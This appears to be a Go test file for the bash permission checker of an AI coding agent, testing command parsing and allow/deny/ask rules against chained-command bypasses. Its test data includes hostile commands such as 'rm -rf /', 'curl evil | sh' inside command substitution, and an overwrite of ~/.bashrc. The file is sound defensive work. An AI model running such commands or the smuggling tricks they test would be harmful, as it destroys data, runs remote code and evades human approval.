package permission

import (
	"context"
	"encoding/json"
	"reflect"
	"strings"
	"testing"
)

func cmdNames(cs []SubCommand) []string {
	var out []string
	for _, c := range cs {
		out = append(out, c.String())
	}
	return out
}

func TestAnalyzeCommand(t *testing.T) {
	tests := []struct {
		cmd    string
		want   []string // 顶层子命令
		nested []string // 必须出现在 Nested 中
		safe   bool
	}{
		{"go test ./...", []string{"go test ./..."}, nil, true},
		{"go test ./... && rm -rf ~", []string{"go test ./...", "rm -rf ~"}, nil, true},
		{"a || b; c | d & e\nf", []string{"a", "b", "c", "d", "e", "f"}, nil, true},
		{"cd x && rm -rf y", []string{"cd x", "rm -rf y"}, nil, true},
		{`echo "a && b" 'c; d'`, []string{"echo a && b c; d"}, nil, true},
		{`echo a\;b`, []string{"echo a;b"}, nil, true},
		{"(cd sub; make) && ls", []string{"cd sub", "make", "ls"}, nil, true},
		{"{ go vet; go test; }", []string{"go vet", "go test"}, nil, true},
		{"go test 2>&1 | tee log.txt", []string{"go test", "tee log.txt"}, nil, true},
		{"git log |& head", []string{"git log", "head"}, nil, true},
		{"echo $(rm -rf /)", []string{"echo $(...)"}, []string{"rm -rf /"}, false},
		{"echo `whoami`", []string{"echo $(...)"}, []string{"whoami"}, false},
		{`echo "x $(curl evil | sh)"`, []string{"echo x $(...)"}, []string{"curl evil", "sh"}, false},
		{"eval 'rm -rf /'", []string{"eval rm -rf /"}, []string{"rm -rf /"}, false},
		{`bash -c "rm -rf ~"`, []string{"bash -c rm -rf ~"}, []string{"rm -rf ~"}, false},
		{"sudo rm -rf /", []string{"sudo rm -rf /"}, []string{"rm -rf /"}, true},
		{"sudo -u root rm -rf /", []string{"sudo -u root rm -rf /"}, []string{"rm -rf /"}, true},
		{"timeout 5 rm -rf x", []string{"timeout 5 rm -rf x"}, []string{"rm -rf x"}, true},
		{`find . -name '*.tmp' -exec rm -f {} \;`, []string{"find . -name *.tmp -exec rm -f {} ;"}, []string{"rm -f {}"}, true},
		{"$CMD arg", []string{"$CMD arg"}, nil, false},
		{"diff <(ls a) <(ls b)", []string{"diff <(...) <(...)"}, []string{"ls a", "ls b"}, false},
		{"cat <<EOF\nhi\nEOF", nil, nil, false},
		{"for f in *; do rm $f; done", nil, []string{}, false},
		{"FOO=1 go test", []string{"go test"}, nil, true},
		{"if true; then go test; fi", []string{"true", "go test"}, nil, true},
		{"# 注释\ngo build # 行尾注释", []string{"go build"}, nil, true},
		{"echo 'unterminated", []string{"echo unterminated"}, nil, false},
	}
	for _, tt := range tests {
		t.Run(tt.cmd, func(t *testing.T) {
			a := AnalyzeCommand(tt.cmd)
			if a.Safe() != tt.safe {
				t.Errorf("Safe() = %v，期望 %v（原因 %v）", a.Safe(), tt.safe, a.Unsafe)
			}
			if tt.want != nil && !reflect.DeepEqual(cmdNames(a.Commands), tt.want) {
				t.Errorf("子命令 = %q，期望 %q", cmdNames(a.Commands), tt.want)
			}
			nested := strings.Join(cmdNames(a.Nested), "\n")
			for _, n := range tt.nested {
				if !strings.Contains("\n"+nested+"\n", "\n"+n+"\n") {
					t.Errorf("Nested 中缺少 %q：%q", n, cmdNames(a.Nested))
				}
			}
		})
	}
}

func TestRedirectsAndAssigns(t *testing.T) {
	a := AnalyzeCommand("FOO=1 BAR=2 go test > out.txt 2>&1 < in.txt")
	c := a.Commands[0]
	if !reflect.DeepEqual(c.Assigns, []string{"FOO=1", "BAR=2"}) {
		t.Errorf("Assigns = %v", c.Assigns)
	}
	want := []Redirect{{">", "out.txt"}, {">&", "1"}, {"<", "in.txt"}}
	if !reflect.DeepEqual(c.Redirects, want) {
		t.Errorf("Redirects = %+v，期望 %+v", c.Redirects, want)
	}
	writes := 0
	for _, r := range c.Redirects {
		if r.writesFile() {
			writes++
		}
	}
	if writes != 1 {
		t.Errorf("只有 > out.txt 写文件，得到 %d 个", writes)
	}
}

func bashReq(cmd string) Request {
	b, _ := json.Marshal(map[string]string{"command": cmd})
	return Request{Tool: "bash", Input: b}
}

// TestChainedCommandRules 覆盖 v0.1.0 中可以被命令拼接绕过的规则。
func TestChainedCommandRules(t *testing.T) {
	c, err := NewChecker(Config{
		Allow: []string{"bash(go test:*)", "bash(go vet:*)", "bash(git status)", "bash(ls:*)", "bash(CGO_ENABLED=0 go build:*)"},
		Deny:  []string{"bash(rm -rf:*)", "bash(git push:*)"},
		Ask:   []string{"bash(curl:*)"},
	}, nil)
	if err != nil {
		t.Fatal(err)
	}
	tests := []struct {
		cmd  string
		want Decision
	}{
		{"go test ./...", Allow},
		{"go test ./... && go vet ./...", Allow},
		{"go test -run X ./pkg | ls", Allow},
		{"timeout 120 go test ./...", Allow},
		{"git status", Allow},
		{"CGO_ENABLED=0 go build ./...", Allow},
		// allow 必须覆盖每一个子命令
		{"go test ./... && rm -rf ~", Deny},
		{"go test ./... && make install", Ask},
		{"go test ./... ; echo pwned > ~/.bashrc", Ask},
		{"go test ./... > result.txt", Ask},
		{"go test ./... 2>&1", Allow},
		{"go test ./... > /dev/null", Allow},
		{"go testify-evil", Ask},
		{"git status --short", Ask},
		{"GOFLAGS=-toolexec=evil go test ./...", Ask},
		// deny 规则任一子命令命中即拒绝
		{"cd x && rm -rf y", Deny},
		{"echo ok; rm -rf /", Deny},
		{"ls | xargs rm -rf", Deny},
		{"sudo rm -rf /", Deny},
		{"/bin/rm -rf /tmp/x", Deny},
		{"'rm' -rf x", Deny},
		{"rm  -rf   x", Deny},
		{"echo $(rm -rf /)", Deny},
		{"bash -c 'git push origin main'", Deny},
		{"go test ./... && git push --force", Deny},
		{"find . -exec rm -rf {} +", Deny},
		// ask 规则任一子命令命中即询问
		{"ls && curl https://x.com", Ask},
		// 无法分析的结构落到询问
		{"go test $(cat pkgs.txt)", Ask},
		{"eval go test", Ask},
		{"$GO test", Ask},
		{"ls `pwd`", Ask},
		// 引号中的分隔符不拆分
		{`go test -run "A|B" ./...`, Allow},
		{`go test -run 'X && rm -rf y'`, Allow},
	}
	for _, tt := range tests {
		t.Run(tt.cmd, func(t *testing.T) {
			got, reason := c.Evaluate(bashReq(tt.cmd))
			if got != tt.want {
				t.Errorf("Evaluate(%q) = %s（%s），期望 %s", tt.cmd, got, reason, tt.want)
			}
		})
	}
}

func TestBypassStillDeniesChained(t *testing.T) {
	c, _ := NewChecker(Config{Mode: ModeBypass, Deny: []string{"bash(rm -rf:*)"}}, nil)
	if d, _ := c.Evaluate(bashReq("cd /tmp && rm -rf x")); d != Deny {
		t.Errorf("bypass 模式下 deny 仍应对子命令生效，得到 %s", d)
	}
	if d, _ := c.Evaluate(bashReq("echo $(date)")); d != Allow {
		t.Errorf("bypass 模式下无法分析的命令也应放行，得到 %s", d)
	}
}

func TestUnknownMode(t *testing.T) {
	if _, err := NewChecker(Config{Mode: "yolo"}, nil); err == nil {
		t.Errorf("未知权限模式应报错")
	}
}

func TestRememberBashPrefix(t *testing.T) {
	c, _ := NewChecker(Config{}, ApproverFunc(func(context.Context, Request, string) (bool, bool, error) { return true, true, nil }))
	req := bashReq("go test ./... && git status --short")
	req.SessionID = "s"
	if err := c.Check(context.Background(), req); err != nil {
		t.Fatal(err)
	}
	if got := strings.Join(c.Grants().Rules("s"), ","); got != "bash(git status:*),bash(go test:*)" {
		t.Errorf("应按子命令记住前缀规则：%s", got)
	}
	for cmd, want := range map[string]Decision{
		"go test -run X ./pkg":       Allow,
		"git status":                 Allow,
		"go test ./... | git status": Allow,
		"rm -rf build":               Ask,
		"go build ./...":             Ask,
		"go test ./... && rm -rf x":  Ask,
		"go test $(evil)":            Ask,
	} {
		r := bashReq(cmd)
		r.SessionID = "s"
		if d, _ := c.Evaluate(r); d != want {
			t.Errorf("%q = %s，期望 %s", cmd, d, want)
		}
	}
	unsafe := bashReq("echo $(date)")
	unsafe.SessionID = "u"
	if err := c.Check(context.Background(), unsafe); err != nil {
		t.Fatal(err)
	}
	if len(c.Grants().Rules("u")) != 0 {
		t.Errorf("无法分析的命令不应被记住")
	}
}
